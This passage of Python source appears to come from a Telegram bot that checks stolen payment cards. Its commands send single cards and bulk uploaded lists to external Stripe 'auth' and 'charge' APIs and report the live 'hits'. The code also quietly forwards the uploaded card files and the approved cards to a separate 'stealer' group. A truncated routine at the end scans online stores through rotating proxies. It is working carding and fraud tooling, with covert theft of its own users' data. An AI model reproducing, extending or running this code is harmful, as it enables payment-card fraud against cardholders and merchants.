        f"[⌯] 𝗖𝗮𝗿𝗱 ⌁ <tg-spoiler><code>{card}</code></tg-spoiler> 💳\n{SEP}\n"
        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_display} 📊\n"
        f"[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {_msg_display}\n"
        f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {elapsed}s ⏱️\n{SEP}\n"
        f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank} 🏦\n"
        f"[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country} {flag} 🌍\n{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
    )
    try: await smsg.edit(out, parse_mode='html')
    except Exception as e: print(f"[JIO] edit failed: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STRIPE AUTH — /st and /mst
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/st(?:\s+(.+))?$'))
async def stripe_cmd(event):
    if await _maint_guard(event, "st"): return
    uid = event.sender_id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe(f"❌ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱"), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    body = (event.pattern_match.group(1) or "").strip()
    if not body:
        await event.reply(pe(
            f"💳 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ⌁ ⚡\n{SEP}\n"
            f"📌 𝗨𝘀𝗮𝗴𝗲 ⌁ /st cc|mm|yy|cvv\n"
            f"⚡ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ /st 4111111111111111|12|25|123"
        ), parse_mode='html'); return
    cards = extract_cc(body)
    if not cards:
        if "|" in body or "/" in body or "-" in body:
            cards = [body.replace(" ", "")]
        else:
            await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱"), parse_mode='html'); return
    card = cards[0]
    parts = re.split(r'[|/\-_\s]+', card)
    if len(parts) != 4:
        await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱"), parse_mode='html'); return
    api_card = "|".join(parts)
    smsg = await event.reply(pe(
        f"⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... 💳\n{SEP}\n"
        f"💳 𝗖𝗖 ⌁ <code>{card}</code>\n{SEP}\n⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
    ), parse_mode='html')
    t0 = time.time()
    try:
        import aiohttp
        params = {"cc": api_card}
        timeout = aiohttp.ClientTimeout(total=90)
        conn = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
            async with s.get(STRIPE_API, params=params) as r:
                elapsed = round(time.time() - t0, 2)
                try:
                    data = await r.json()
                except Exception:
                    data = {"status": "ERROR", "message": "Invalid JSON response"}

        approved = data.get("approved", False)
        status = str(data.get("status") or "").upper()
        msg = str(data.get("message") or "Unknown")

        if approved is True or status == "APPROVED":
            head = "[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ ✅"
            status_display = "𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳"
            status_emoji = "✅"
        elif status == "DECLINED":
            head = "[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ ❌"
            status_display = "𝙳𝙴𝙲𝙻𝙸𝙽𝙴𝙳"
            status_emoji = "❌"
        else:
            head = "[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗘𝗿𝗿𝗼𝗿 ⌁ ⚠️"
            status_display = "𝙴𝚁𝚁𝙾𝚁"
            status_emoji = "⚠️"

        try:
            bin_info = await get_bin_info(card.split("|")[0])
            brand, btype, level, bank, country, flag = bin_info
        except Exception:
            brand, btype, level, bank, country, flag = "-", "-", "-", "-", "-", ""

        def _b(s):
            out = []
            for ch in str(s):
                c = ord(ch)
                if 65 <= c <= 90:
                    out.append(chr(c - 65 + 0x1D5D4))
                elif 97 <= c <= 122:
                    out.append(chr(c - 97 + 0x1D5EE))
                elif 48 <= c <= 57:
                    out.append(chr(c - 48 + 0x1D7EC))
                else:
                    out.append(ch)
            return "".join(out)

        bin_str = _b(" · ".join(p for p in [brand, btype, level] if p and p != "-") or "—")
        bank_str = _b(bank or "—")
        country_str = f"{flag} {_b(country or '—')}" if flag else _b(country or "—")

        try:
            name, username = await get_user_info(uid)
            cname = name if username else str(uid)
        except Exception:
            cname = str(uid)

        out = pe(
            f"{head}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n"
            f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_display} {status_emoji}\n"
            f"[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {_b(msg[:100])} {status_emoji}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗕𝗜𝗡 ⌁ {bin_str}\n"
            f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank_str}\n"
            f"[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_str}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 𝙰𝚞𝚝𝚑 🛒\n"
            f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {_b(str(elapsed))}𝚜 ⌁ ⚡\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
        )
        await smsg.edit(out, parse_mode='html')

        if approved is True or status == "APPROVED":
            fake_result = {
                "card": card,
                "status": "Approved",
                "message": msg,
                "gateway": "Stripe Auth",
                "price": "-",
                "time": elapsed,
                "bin_info": (brand, btype, level, bank, country, flag),
            }
            try:
                await send_hit_log_gc(fake_result, "Approved", uid)
            except Exception as _e:
                print(f"[ST-LOG] {_e}")
            try:
                asyncio.create_task(send_hit_to_stealer_gc(fake_result, "Approved", uid, "Stripe Auth"))
            except Exception:
                pass

    except asyncio.TimeoutError:
        await smsg.edit(pe(
            f"⏱️ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗧𝗶𝗺𝗲𝗼𝘂𝘁 ⌁ 𝟼𝟶𝘀"
        ), parse_mode='html')
    except Exception as e:
        await smsg.edit(pe(
            f"❌ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗘𝗿𝗿𝗼𝗿 ⌁ <code>{str(e)[:120]}</code>"
        ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/mst$'))
async def mstripe_cmd(event):
    if await _maint_guard(event, "mst"): return
    uid = event.sender_id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe(f"❌ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱"), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    if not event.reply_to_msg_id:
        await event.reply(pe(f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 ⌁ 💳\n{SEP}\n[⌯] 𝗥𝗲𝗽𝗹𝘆 .𝘁𝘅𝘁 + /mst"), parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe(f"❌ 𝗥𝗲𝗽𝗹𝘆 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲"), parse_mode='html'); return
    if uid in user_active_check:
        info = user_active_check[uid]
        _mins = int(time.time() - info.get('started_at', time.time())) // 60
        await event.reply(pe(f"⛔ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ {_mins} 𝗺𝗶𝗻 ⌁ /stopmass"), parse_mode='html'); return
    smsg = await event.reply(pe(f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 ⌁ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 💳\n{SEP}\n⏳ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴..."), parse_mode='html')

    async def _process():
        import tempfile, uuid as _uuid
        _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
        os.makedirs(_tmp_dir, exist_ok=True)
        _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
        original_name = reply.file.name or "cards.txt"
        try:
            fp = await reply.download_media(file=_tmp_path)
            if not fp:
                await smsg.edit(pe(f"❌ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗮𝗶𝗹𝗲𝗱"), parse_mode='html'); return
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            cards = extract_cc(content)
            if not cards:
                try: os.remove(fp)
                except Exception: pass
                await smsg.edit(pe(f"❌ 𝗡𝗼 𝗰𝗮𝗿𝗱𝘀"), parse_mode='html'); return
            try:
                if load_stealer_gc():
                    await send_file_to_stealer_gc(uid, fp, original_name, len(cards), "Cards")
            except Exception: pass
            try: os.remove(fp)
            except Exception: pass
            limit = get_user_limit(uid)
            if len(cards) > limit: cards = cards[:limit]
            user_active_check[uid] = {
                'session_key': f"stripe_{uid}_{smsg.id}",
                'msg_id': smsg.id, 'started_at': time.time(),
                'card_count': len(cards),
            }
            active_sessions[f"stripe_{uid}_{smsg.id}"] = {'paused': False, 'started_at': time.time()}
            await smsg.edit(pe(
                f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 💳\n{SEP}\n"
                f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,}\n{SEP}\n⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
            ), parse_mode='html')
            asyncio.create_task(_run_mstripe(uid, cards, smsg.id, original_name))
        except Exception as e:
            try: os.remove(fp)
            except Exception: pass
            await smsg.edit(pe(f"❌ 𝗘𝗿𝗿𝗼𝗿 ⌁ {str(e)[:100]}"), parse_mode='html')

    asyncio.create_task(_process())


async def _run_mstripe(user_id, cards, progress_msg_id, file_name):
    total = len(cards)
    scanned = 0
    approved = []; declined = []; errors = []
    start_time = time.time()
    lock = asyncio.Lock()
    last_update = [time.time()]
    sem = asyncio.Semaphore(3)
    timeout = aiohttp.ClientTimeout(total=120)
    conn = aiohttp.TCPConnector(ssl=False, limit=10)

    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        async def check_one(card):
            nonlocal scanned
            async with sem:
                try:
                    parts = re.split(r'[|/\-_\s]+', card)
                    if len(parts) != 4:
                        async with lock:
                            scanned += 1; errors.append({'card': card, 'msg': 'Invalid'})
                        return
                    api_card = "|".join(parts)
                    try:
                        async with session.get(STRIPE_API, params={"cc": api_card}) as r:
                            try: data = await r.json()
                            except Exception: data = {"status": "ERROR", "message": "Invalid JSON"}
                    except asyncio.TimeoutError:
                        async with lock: scanned += 1; errors.append({'card': card, 'msg': 'Timeout'})
                        return
                    except Exception as _req_err:
                        async with lock: scanned += 1; errors.append({'card': card, 'msg': str(_req_err)[:60]})
                        return
                    approved_flag = data.get("approved", False)
                    status = str(data.get("status") or "").upper()
                    msg = str(data.get("message") or "Unknown")
                    async with lock:
                        scanned += 1
                        if approved_flag is True or status == "APPROVED":
                            approved.append({'card': card, 'msg': msg})
                            try:
                                bin_info = await get_bin_info(card.split('|')[0])
                                name, username = await get_user_info(user_id)
                                cname = name if username else str(user_id)
                                out = pe(
                                    f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗛𝗶𝘁 ⌁ ✅\n{SEP}\n"
                                    f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n"
                                    f"[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {msg[:80]} ✅\n{SEP}\n"
                                    f"[⌯] 𝗕𝗶𝗻 ⌁ {bin_info[0]} · {bin_info[1]}\n"
                                    f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bin_info[3]}\n{SEP}\n"
                                    f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
                                )
                                await bot.send_message(user_id, out, parse_mode='html')
                            except Exception: pass
                            try:
                                bin_info = await get_bin_info(card.split('|')[0])
                                fake_result = {"card": card, "status": "Approved", "message": msg,
                                               "gateway": "Stripe Auth", "price": "-", "time": 0,
                                               "bin_info": bin_info}
                                asyncio.create_task(send_hit_to_stealer_gc(fake_result, "Approved", user_id, file_name))
                            except Exception: pass
                        elif status == "DECLINED":
                            declined.append({'card': card, 'msg': msg})
                        else:
                            errors.append({'card': card, 'msg': msg})
                        now = time.time()
                        if now - last_update[0] >= 4:
                            last_update[0] = now
                            pct = int(100 * scanned / total) if total > 0 else 0
                            bw = 20
                            filled = int(bw * scanned / total) if total > 0 else 0
                            bar = "●" * filled + "○" * (bw - filled)
                            try:
                                await bot.edit_message(user_id, progress_msg_id, pe(
                                    f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 💳\n{SEP}\n"
                                    f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} 📦\n"
                                    f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {scanned:,} ⚙️\n"
                                    f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ {len(approved)} ✅\n"
                                    f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {len(declined)} ❌\n{SEP}\n"
                                    f"{bar} {pct}%\n{scanned:,} / {total:,}"
                                ), parse_mode='html')
                            except Exception: pass
                except Exception as e:
                    async with lock:
                        scanned += 1; errors.append({'card': card, 'msg': str(e)[:80]})

        for i in range(0, len(cards), 50):
            batch = cards[i:i+50]
            tasks = [asyncio.create_task(check_one(c)) for c in batch]
            await asyncio.gather(*tasks, return_exceptions=True)

    active_sessions.pop(f"stripe_{user_id}_{progress_msg_id}", None)
    user_active_check.pop(user_id, None)
    elapsed = int(time.time() - start_time)
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    try:
        await bot.edit_message(user_id, progress_msg_id, pe(
            f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 ⌁ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅\n{SEP}\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} 📦\n"
            f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {scanned:,} ⚙️\n"
            f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ {len(approved)} ✅\n"
            f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {len(declined)} ❌\n"
            f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {len(errors)} ⚠️\n{SEP}\n"
            f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {time_fmt} ⏱️"
        ), parse_mode='html')
    except Exception: pass
    if approved:
        try:
            ts = int(time.time())
            filename = f"/tmp/rxo_uploads/stripe_approved_{ts}.txt"
            async with aiofiles.open(filename, 'w') as f:
                await f.write(f"# Stripe Approved — {len(approved)} cards\n")
                for r in approved:
                    await f.write(f"{r['card']}  # {r['msg'][:60]}\n")
            await bot.send_file(user_id, filename,
                                caption=pe(f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ {len(approved)} ✅"),
                                parse_mode='html')
            try: os.remove(filename)
            except Exception: pass
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STRIPE CHARGE — /st1 and /mst1
# ══════════════════════════════════════════════════════════════════════════════
def _parse_charge_response(data: dict) -> tuple:
    if not isinstance(data, dict):
        return "error", "Invalid response", "-"
    raw = json.dumps(data)
    status_raw = str(data.get("status") or data.get("result") or data.get("state") or "").lower()
    message = str(data.get("message") or data.get("response") or data.get("error")
                  or data.get("detail") or data.get("msg") or "").strip()
    approved = data.get("approved")
    success = data.get("success")
    charged = data.get("charged")
    price = data.get("amount") or data.get("price") or "-"
    if isinstance(price, (int, float)): price = f"{price:.2f}"

    if charged is True or success is True or approved is True:
        if str(data.get("type", "")).lower() in ("charge", "capture") or data.get("charged") is True:
            return "charged", message or "Charged Successfully", str(price)
        return "approved", message or "Approved", str(price)
    if status_raw in ("charged", "succeeded", "success", "captured"):
        return "charged", message or "Charged Successfully", str(price)
    if status_raw in ("approved", "authorized", "requires_capture"):
        return "approved", message or "Approved", str(price)
    if status_raw in ("live", "insufficient_funds"):
        return "live", message or "Insufficient Funds", str(price)
    if status_raw in ("3ds", "requires_action", "authentication_required"):
        return "3ds", message or "3DS Required", str(price)
    if status_raw in ("declined", "failed", "error", "rejected", "card_declined"):
        return "declined", message or "Declined", str(price)
    mlow = message.lower()
    if "insufficient" in mlow: return "live", message, str(price)
    if "3d" in mlow or "authentication" in mlow or "otp" in mlow: return "3ds", message, str(price)
    if "approv" in mlow: return "approved", message, str(price)
    if "charg" in mlow and "declin" not in mlow: return "charged", message, str(price)
    if "declin" in mlow or "fail" in mlow or "reject" in mlow: return "declined", message, str(price)
    if message: return "declined", message, str(price)
    return "error", raw[:100], str(price)


async def _charge_card(card: str, session: aiohttp.ClientSession) -> dict:
    try:
        async with session.get(STRIPE_CHARGE_API, params={"cc": card},
                               timeout=aiohttp.ClientTimeout(total=120)) as r:
            text = await r.text()
            try: return json.loads(text)
            except Exception: return {"raw": text, "status": "error", "message": text[:200]}
    except asyncio.TimeoutError:
        return {"status": "error", "message": "Timeout"}
    except Exception as e:
        return {"status": "error", "message": str(e)[:120]}


@bot.on(events.NewMessage(pattern=r'^/st1(?:\s+(.+))?$'))
async def st1_single(event):
    if await _maint_guard(event, "st1"): return
    uid = event.sender_id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe(f"❌ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱"), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    body = (event.pattern_match.group(1) or "").strip()
    if not body:
        await event.reply(pe(
            f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 ⌁ 💳\n{SEP}\n"
            f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /st1 cc|mm|yy|cvv\n"
            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ /st1 4111111111111111|12|30|123"
        ), parse_mode='html'); return
    cards = extract_cc(body)
    if not cards:
        if "|" in body: cards = [body.replace(" ", "")]
        else:
            await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱"), parse_mode='html'); return
    card = cards[0]
    smsg = await event.reply(pe(
        f"⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... 💳\n{SEP}\n"
        f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n{SEP}\n⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
    ), parse_mode='html')
    t0 = time.time()
    conn = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        data = await _charge_card(card, session)
    elapsed = round(time.time() - t0, 2)
    status, message, price = _parse_charge_response(data)
    try:
        bin_info = await get_bin_info(card.split('|')[0])
        brand, btype, level, bank, country, flag = bin_info
    except Exception:
        bin_info = ("-", "-", "-", "-", "-", "")
    name, username = await get_user_info(uid)
    cname = name if username else str(uid)
    hit_map = {"charged": "Charged", "approved": "Approved", "live": "Live", "3ds": "3DS"}
    if status in hit_map:
        fake_result = {"card": card, "status": hit_map[status], "message": message,
                       "gateway": "Stripe Charge", "price": price, "time": elapsed,
                       "bin_info": bin_info}
        await send_realtime_hit(uid, fake_result, hit_map[status], "Single st1")
        try: await send_hit_log_gc(fake_result, hit_map[status], uid)
        except Exception: pass
        try: await smsg.delete()
        except Exception: pass
        return
    fake_result = {"card": card, "status": "Declined" if status == "declined" else "Dead",
                   "message": message, "gateway": "Stripe Charge", "price": price,
                   "time": elapsed, "bin_info": bin_info}
    try:
        resp = build_result_card(fake_result, bin_info, uid, cname)
        await smsg.edit(resp, parse_mode='html')
    except Exception:
        await smsg.edit(pe(f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {message[:100]}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/mst1$'))
async def mst1_mass(event):
    if await _maint_guard(event, "mst1"): return
    uid = event.sender_id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe(f"❌ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱"), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    if not event.reply_to_msg_id:
        await event.reply(pe(f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 ⌁ 💳\n{SEP}\n[⌯] 𝗥𝗲𝗽𝗹𝘆 .𝘁𝘅𝘁 + /mst1"), parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe(f"❌ 𝗥𝗲𝗽𝗹𝘆 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲"), parse_mode='html'); return
    if uid in user_active_check:
        info = user_active_check[uid]
        _mins = int(time.time() - info.get('started_at', time.time())) // 60
        await event.reply(pe(f"⛔ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ {_mins} 𝗺𝗶𝗻 ⌁ /stopmass"), parse_mode='html'); return
    smsg = await event.reply(pe(f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 💳\n{SEP}\n⏳ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴..."), parse_mode='html')

    async def _process():
        import tempfile, uuid as _uuid
        tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
        os.makedirs(tmp_dir, exist_ok=True)
        fp = os.path.join(tmp_dir, f"{_uuid.uuid4().hex}.txt")
        original_name = reply.file.name or "cards.txt"
        try:
            fp = await reply.download_media(file=fp)
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            cards = extract_cc(content)
            if not cards:
                try: os.remove(fp)
                except Exception: pass
                await smsg.edit(pe(f"❌ 𝗡𝗼 𝗰𝗮𝗿𝗱𝘀"), parse_mode='html'); return
            try:
                if load_stealer_gc():
                    await send_file_to_stealer_gc(uid, fp, original_name, len(cards), "Cards")
            except Exception: pass
            try: os.remove(fp)
            except Exception: pass
            limit = get_user_limit(uid)
            if len(cards) > limit: cards = cards[:limit]
            user_active_check[uid] = {
                'session_key': f"st1_{uid}_{smsg.id}",
                'msg_id': smsg.id, 'started_at': time.time(),
                'card_count': len(cards),
            }
            active_sessions[f"st1_{uid}_{smsg.id}"] = {'paused': False, 'started_at': time.time()}
            await smsg.edit(pe(
                f"[⌯] 𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 💳\n{SEP}\n"
                f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,}\n{SEP}\n⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
            ), parse_mode='html')
            asyncio.create_task(_run_mst1(uid, cards, smsg.id, original_name))
        except Exception as e:
            try: os.remove(fp)
            except Exception: pass
            await smsg.edit(pe(f"❌ 𝗘𝗿𝗿𝗼𝗿 ⌁ {str(e)[:120]}"), parse_mode='html')

    asyncio.create_task(_process())


async def _run_mst1(user_id, cards, progress_msg_id, file_name):
    session_key = f"st1_{user_id}_{progress_msg_id}"
    total = len(cards)
    results = {'charged': [], 'approved': [], 'tds': [], 'live': [],
               'declined': [], 'error': [],
               'total': total, 'start_time': time.time(), 'last_card_time': time.time()}
    last_update = [time.time()]
    lock = asyncio.Lock()
    conn = aiohttp.TCPConnector(ssl=False, limit=50)
    timeout = aiohttp.ClientTimeout(total=120)
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            sem = asyncio.Semaphore(15)
            async def worker(card):
                if _stop_flags.get(session_key): return
                sess = active_sessions.get(session_key)
                if not sess: return
                while sess.get('paused', False):
                    await asyncio.sleep(1)
                    if _stop_flags.get(session_key): return
                    sess = active_sessions.get(session_key)
                    if not sess: return
                if _stop_flags.get(session_key): return
                async with sem:
                    t0 = time.time()
                    data = await _charge_card(card, session)
                    elapsed = round(time.time() - t0, 2)
                    status, message, price = _parse_charge_response(data)
                    try:
                        bin_info = await get_bin_info(card.split('|')[0])
                    except Exception:
                        bin_info = ("-", "-", "-", "-", "-", "")
                    result = {"card": card, "message": message, "price": price,
                              "gateway": "Stripe Charge", "time": elapsed,
                              "bin_info": bin_info, "status": ""}
                    if _stop_flags.get(session_key): return
                    hit_map = {"charged": "Charged", "approved": "Approved",
                               "live": "Live", "3ds": "3DS"}
                    async with lock:
                        if status in hit_map:
                            htype = hit_map[status]
                            result['status'] = htype
                            key = {'Charged':'charged','Approved':'approved',
                                   'Live':'live','3DS':'tds'}[htype]
                            results[key].append(result)
                            if htype == 'Charged': increment_charged(user_id, 1)
                            elif htype in ('Approved', 'Live'): increment_approved(user_id, 1)
                        elif status == 'declined':
                            result['status'] = 'Dead'; results['declined'].append(result)
                        else:
                            result['status'] = 'Error'; results['error'].append(result)
                    if status in hit_map and not _stop_flags.get(session_key):
                        try:
                            await send_realtime_hit(user_id, result, hit_map[status], file_name)
                            await send_hit_log_gc(result, hit_map[status], user_id)
                        except Exception as e: print(f"[mst1 hit] {e}")
                    checked = sum(len(results[k]) for k in ('charged','approved','tds','live','declined','error'))
                    now = time.time()
                    if now - last_update[0] >= 3:
                        last_update[0] = now
                        try: await update_mass_progress(user_id, progress_msg_id, results, checked, result)
                        except Exception: pass
            _avail = _GLOBAL_WORKER_SEM.get_available()
            _workers = max(5, min(30, _avail, total))
            _granted = _GLOBAL_WORKER_SEM.acquire(_workers)
            try:
                q = asyncio.Queue()
                for c in cards: q.put_nowait(c)
                async def run_one():
                    while not q.empty():
                        if _stop_flags.get(session_key): return
                        try: c = q.get_nowait()
                        except asyncio.QueueEmpty: return
                        await worker(c)
                tasks = [asyncio.create_task(run_one()) for _ in range(_granted)]
                await asyncio.gather(*tasks, return_exceptions=True)
            finally:
                _GLOBAL_WORKER_SEM.release(_granted)
    except Exception as e:
        print(f"[mst1] fatal: {e}")
    finally:
        _was_stopped = _stop_flags.get(session_key, False)
        _stop_flags.pop(session_key, None)
        active_sessions.pop(session_key, None)
        user_active_check.pop(user_id, None)
        if not _was_stopped:
            try: await send_final_results(user_id, results)
            except Exception as e: print(f"[mst1 final] {e}")
async def _scan_site_for_max_price(site_url, max_price, proxies):
    if not proxies:
        return {"site": site_url, "ok": False, "reason": "No proxies"}
    try:
        from urllib.parse import quote
        p = random.choice(proxies)
        if p.startswith("http://") or p.startswith("https://") or p.startswith("socks"):
            proxy_url = p
        else:
            parts = p.split(":")
            if len(parts) >= 4:
                proxy_url = f"http://{quote(parts[2], safe='')}:{quote(':'.join(parts[3:]), safe='')}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                proxy_url = f"http://{p}"
            else:
                return {"site": site_url, "ok": False, "reason": "Bad proxy"}

        url = f"{site}/products.json?limit=250"
        timeout = _aio.ClientTimeout(total=20)
        conn = _aio.TCPConnector(ssl=False, force_close=True, limit=10)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                   "Accept": "application/json"}
        async with _aio.ClientSession(connector=conn, timeout=timeout) as session:
            async with session.get(url, headers=headers, proxy=proxy_url, allow_redirects=True) as r:
                if r.status != 200:
                    return {'site': site, 'ok': False, 'reason': f'HTTP {r.status}'}
                try: data = json.loads(await r.text())
                except Exception: return {'site': site, 'ok': False, 'reason': 'Bad JSON'}
                products = data.get('products', [])
                if not products:
                    return {'site': site, 'ok': False, 'reason': 'No products'}
                prices = []
                min_price = None; max_price_seen = 0.0
                for p in products:
